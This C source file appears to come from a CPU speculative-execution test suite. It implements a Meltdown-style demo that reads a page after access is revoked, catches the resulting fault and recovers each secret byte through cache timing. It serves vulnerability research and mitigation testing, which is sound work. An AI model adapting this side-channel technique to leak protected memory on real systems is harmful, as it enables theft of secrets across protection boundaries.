#include "local.h"
#include "timing_array.h"
#include "trex.h"
#include "demo.h"

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/ucontext.h>

#if !defined(TREX_POWER) && !defined(TREX_X86_64)
#error This demo doesn't support the architecture you're building it on.
#endif

extern char after_speculation[];
char *private_page;

static void handler(int signum __unused, siginfo_t *sinfo __unused, void *ctx)
{
	ucontext_t *ucontext = ctx;
#if defined(TREX_POWER)
	ucontext->uc_mcontext.regs->nip = (uintptr_t)after_speculation;
#elif defined(TREX_X86_64)
	ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t)after_speculation;
#endif
}

static void setup_sighandler(void)
{
	struct sigaction act;

	memset(&act, 0, sizeof(struct sigaction));
	act.sa_sigaction = handler;
	act.sa_flags = SA_SIGINFO;
	sigaction(SIGSEGV, &act, 0);
}

static char leak_byte(size_t offset)
{
	struct timing_array *ta = ta_new();
	int run, result;

	for (run = 0;; run++) {
		ta_flush(ta);

		for (int i = 0; i < 256; ++i) {
			force_read(private_page);

			mprotect(private_page, page_size, PROT_NONE);

			barrier_nospec();

			force_read(ta->entries[(size_t)private_page[offset]]);

			printf("Dead code. Must not be printed\n");
			if (strlen(private_data) != 0) {
				ta_free(ta);
				munmap(private_page, page_size);
				trex_demo_exit(TREX_ERROR);
			}

			__asm__ volatile("after_speculation:");

			mprotect(private_page, page_size, PROT_READ | PROT_WRITE);
		}

		result = ta_find_first_cached_index_after(ta, 0);
		if (result >= 0) {
			ta_free(ta);
			return (char)result;
		}

		if (run > 100000) {
			ta_free(ta);
			munmap(private_page, page_size);
			trex_demo_exit(TREX_COULDNT_LEAK);
		}
	}
}

int main(void)
{
	trex_demo_init(false, true);

	setup_sighandler();

	private_page = mmap(0, page_size, PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memcpy(private_page, private_data, strlen(private_data) + 1);

	for (size_t i = 0; i < strlen(private_data); ++i) {
		print_leak(leak_byte(i), i);
	}

	munmap(private_page, page_size);
	trex_demo_exit(TREX_SUCCESS);
}
